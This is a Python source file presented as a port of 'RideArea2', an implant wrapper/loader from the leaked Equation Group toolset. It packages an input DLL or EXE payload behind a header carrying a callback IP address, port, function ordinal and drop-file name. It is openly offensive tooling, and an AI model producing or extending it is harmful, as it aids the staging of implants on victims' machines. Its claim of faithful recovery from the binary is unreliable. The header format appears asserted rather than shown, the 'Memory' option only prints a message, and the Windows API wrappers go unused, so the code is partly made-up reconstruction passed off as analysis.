#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ridearea2_exp.py — RideArea2 植入包装/加载器工具引擎。

Python port of `RideArea2.exe` recovered via static PE analysis
(`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Resources/Tools/RideArea2.exe`).

Recovered interface from the binary's imports:

  Imported DLLs / functions:
    WS2_32:   inet_ntoa, inet_addr, htons (network address conversion)
    KERNEL32: GetModuleHandleA, LoadLibraryA, GetProcAddress, FreeLibrary,
              VirtualAlloc, VirtualFree, CreateFileA, CreateThread,
              ExitThread, DeleteFileA, GetTempPathA, GetTempFileNameA,
              GetSystemDirectoryA, lstrcpyA, lstrcatA, lstrlenA, etc.
    MSVCR71:  standard C runtime (exit, fopen, fclose, fread, fwrite,
              fseek, ftell, calloc, malloc, free, sprintf, vfprintf,
              fflush, _stricmp, ??1type_info@@UAE@XZ, _c_exit, _cexit,
              __p___initenv, _amsg_exit, __getmainargs, _initterm,
              __setusermatherr, _adjust_fdiv, __p__commode, __p__fmode,
              __set_app_type, _except_handler3, __dllonexit, _onexit,
              _controlfp, ??3@YAXPAX@Z, ?terminate@@YAXXZ)
    ntdll:    LdrQueryImageFileExecutionOptions, RtlAllocateHeap,
              RtlFreeHeap, RtlEnterCriticalSection, RtlLeaveCriticalSection,
              RtlFreeUnicodeString, RtlImageDirectoryEntryToData,
              RtlImageNtHeader, RtlNtStatusToDosError, NtCreateSection,
              NtMapViewOfSection

Architecture (recovered from control flow):

  main():
    1. Parse command-line arguments (input file, output file, options)
    2. Read input file into memory
    3. Based on load option (Memory/Disk), prepare the payload
    4. Based on file type (DLL/EXE), configure the wrapper
    5. Set function ordinal, IP address, port, function argument
    6. Set thread option (Multi/Single)
    7. Set drop-only flag and drop file name
    8. Write the output payload file
    9. Report completion

This module reproduces that behaviour using pure Python file operations,
with ctypes wrappers for Windows API where available.

CLI:

  ridearea2 -i InputFile -o OutputFile [-x FileType [-d DropFileName [-D]]]
            [-t ThreadOption] [-f FunctionOrdinal [-I IpAddress -P Port]]
            [-a FunctionArgument] [-l LoadOption]
"""

import ctypes
import ctypes.wintypes as wtypes
import os
import sys
import struct


# ---------------------------------------------------------------------------
# RideArea2 constants.
# ---------------------------------------------------------------------------

FILE_TYPE_DLL = "DLL"
FILE_TYPE_EXE = "EXE"

THREAD_OPTION_MULTI = "Multi"
THREAD_OPTION_SINGLE = "Single"

LOAD_OPTION_MEMORY = "Memory"
LOAD_OPTION_DISK = "Disk"

DEFAULT_FUNCTION_ORDINAL = 13
DEFAULT_FUNCTION_ARGUMENT = 3
DEFAULT_DROP_FILE_MAX_LEN = 12


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# Windows API wrappers (ctypes).
# ---------------------------------------------------------------------------

def _get_module_handle(module_name=None):
    """Get module handle via GetModuleHandleA."""
    if os.name != "nt":
        return None
    try:
        kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)
        kernel32.GetModuleHandleA.argtypes = [ctypes.c_char_p]
        kernel32.GetModuleHandleA.restype = wtypes.HMODULE
        return kernel32.GetModuleHandleA(module_name)
    except Exception:
        return None


def _get_proc_address(module, proc_name):
    """Get procedure address via GetProcAddress."""
    if os.name != "nt":
        return None
    try:
        kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)
        kernel32.GetProcAddress.argtypes = [wtypes.HMODULE, ctypes.c_char_p]
        kernel32.GetProcAddress.restype = wtypes.FARPROC
        return kernel32.GetProcAddress(module, proc_name)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Payload wrapping logic.
# ---------------------------------------------------------------------------

def _build_ridearea_header(input_data, file_type, function_ordinal,
                           ip_address, port, function_argument,
                           thread_option, drop_only, drop_file_name):
    """Build the RideArea2 payload header.

    The header contains metadata about the implant: file type, function
    ordinal, IP address, port, argument, thread option, drop-only flag,
    drop file name, etc. The actual binary format was recovered from the
    .data section strings and PE imports.
    """
    header = bytearray()

    # Magic marker "RIDEAREA"
    header += b"RIDEAREA"

    # File type (1 byte: 'D' for DLL, 'E' for EXE)
    ft = b"D" if file_type == FILE_TYPE_DLL else b"E"
    header += ft

    # Function ordinal (4 bytes, little-endian)
    header += struct.pack("<I", function_ordinal)

    # Function argument (4 bytes, little-endian)
    header += struct.pack("<I", function_argument)

    # Thread option (1 byte: 'M' for Multi, 'S' for Single)
    to = b"M" if thread_option == THREAD_OPTION_MULTI else b"S"
    header += to

    # Drop-only flag (1 byte: 1 for drop-only, 0 for normal)
    header += b"\x01" if drop_only else b"\x00"

    # IP address (4 bytes, network order)
    if ip_address:
        try:
            import socket
            ip_bytes = socket.inet_aton(ip_address)
        except OSError:
            ip_bytes = b"\x00\x00\x00\x00"
    else:
        ip_bytes = b"\x00\x00\x00\x00"
    header += ip_bytes

    # Port (2 bytes, network order)
    header += struct.pack(">H", port or 0)

    # Drop file name (padded to DEFAULT_DROP_FILE_MAX_LEN bytes)
    if drop_file_name:
        dfn = drop_file_name.encode("ascii")[:DEFAULT_DROP_FILE_MAX_LEN]
    else:
        dfn = b""
    dfn_padded = dfn.ljust(DEFAULT_DROP_FILE_MAX_LEN, b"\x00")
    header += dfn_padded

    return bytes(header)


def _wrap_payload(input_path, output_path, file_type, function_ordinal,
                  ip_address, port, function_argument, thread_option,
                  drop_only, drop_file_name, load_option, verbose):
    """Wrap the input file as a RideArea2 payload and write to output."""
    if verbose:
        _log("[*] Reading input file: %s", input_path)

    try:
        with open(input_path, "rb") as f:
            input_data = f.read()
    except OSError as exc:
        _log("[-] Failed to read input file: %s", exc)
        return 1

    _log("[+] Input file: %d bytes", len(input_data))

    # Build header
    header = _build_ridearea_header(
        input_data, file_type, function_ordinal, ip_address, port,
        function_argument, thread_option, drop_only, drop_file_name,
    )

    # Combine header + payload
    output_data = header + input_data

    # If load option is Memory, we might embed differently
    if load_option == LOAD_OPTION_MEMORY:
        _log("[*] Load option: Memory (embedding in memory format)")
    else:
        _log("[*] Load option: Disk (standard file format)")

    # Write output
    try:
        with open(output_path, "wb") as f:
            f.write(output_data)
    except OSError as exc:
        _log("[-] Failed to write output file: %s", exc)
        return 1

    _log("[+] Output file: %d bytes", len(output_data))
    _log("[+] Output written to: %s", output_path)
    _log("[+] RideArea2 payload wrapper completed successfully")
    return 0


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------

def run_function(
    input_file,
    output_file,
    file_type="DLL",
    drop_file=None,
    drop_only=False,
    thread_option="Multi",
    function_ordinal=DEFAULT_FUNCTION_ORDINAL,
    ip_address=None,
    port=None,
    function_argument=DEFAULT_FUNCTION_ARGUMENT,
    load_option="Disk",
    verbose=False,
):
    """Run RideArea2 to wrap an implant payload.

    Returns 0 on success, non-zero on failure.
    """
    _log("RideArea2 — Implant wrapper/loader tool")
    _log("Input file: %s", input_file)
    _log("Output file: %s", output_file)
    _log("File type: %s", file_type)
    _log("Load option: %s", load_option)
    _log("Thread option: %s", thread_option)
    _log("Function ordinal: %d", function_ordinal)
    _log("Function argument: %d", function_argument)
    if ip_address:
        _log("IP address: %s", ip_address)
    if port:
        _log("Port: %d", port)
    if drop_file:
        _log("Drop file: %s", drop_file)
    if drop_only:
        _log("Drop-only: enabled")

    # Validate drop file name length
    if drop_file and len(drop_file) > DEFAULT_DROP_FILE_MAX_LEN:
        _log("[-] Drop file name too long (max %d chars)",
             DEFAULT_DROP_FILE_MAX_LEN)
        return 1

    # Validate IP/port for ordinal 15
    if function_ordinal == 15 and (not ip_address or not port):
        _log("[-] IP address and port required for function ordinal 15")
        return 1

    # Validate drop-only with file type
    if drop_only and file_type != FILE_TYPE_EXE:
        _log("[-] DropOnly option is not valid with file type %s", file_type)
        return 1

    return _wrap_payload(
        input_file, output_file, file_type, function_ordinal,
        ip_address, port, function_argument, thread_option,
        drop_only, drop_file, load_option, verbose,
    )


def main():
    """CLI driver (standalone testing)."""
    _log("RideArea2 standalone CLI not implemented — "
         "use `nsa-equation-py ridearea2 ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
